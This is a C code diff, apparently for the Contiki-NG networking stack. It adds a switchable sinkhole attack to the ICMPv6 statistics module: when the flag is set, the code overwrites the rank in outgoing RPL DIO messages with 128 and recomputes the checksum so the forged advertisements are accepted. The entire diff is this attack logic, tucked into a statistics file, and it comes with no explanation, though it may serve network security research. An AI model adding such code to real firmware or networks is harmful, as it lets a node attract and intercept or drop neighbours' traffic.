@@ -46,6 +46,7 @@
 #define LOG_LEVEL LOG_LEVEL_INFO
 
 struct icmp6_stats icmp6_stats;
+bool icmp6_stats_sink_hole = false;
 /*---------------------------------------------------------------------------*/
 static const char *
 get_proto_as_string(uint8_t proto)
@@ -152,12 +153,29 @@ process_dis_output(struct uip_icmp_hdr *hdr)
 static void
 process_dio_output(struct uip_icmp_hdr *hdr)
 {
+  uint8_t *payload;
+
   if(uip_is_addr_mcast(&UIP_IP_BUF->destipaddr)) {
     /* Multicast */
     icmp6_stats.dio_mc_sent++;
   } else {
     /* Unicast */
     icmp6_stats.dio_uc_sent++;
+  }
+
+  if(icmp6_stats_sink_hole) {
+    uint16_t new_rank = 128;
+    payload = (uint8_t *)(hdr + 1);
+    printf("check DIO: i: %u ver: %u rank: %u => rank: %u\n",
+           payload[0], payload[1],
+           ((uint16_t)payload[2] << 8) + payload[3],
+           new_rank);
+    payload[2] = new_rank >> 8;
+    payload[3] = new_rank & 0xff;
+
+    /* Recalculate checksum */
+    hdr->icmpchksum = 0;
+    hdr->icmpchksum = ~uip_icmp6chksum();
   }
 }
 /*---------------------------------------------------------------------------*/
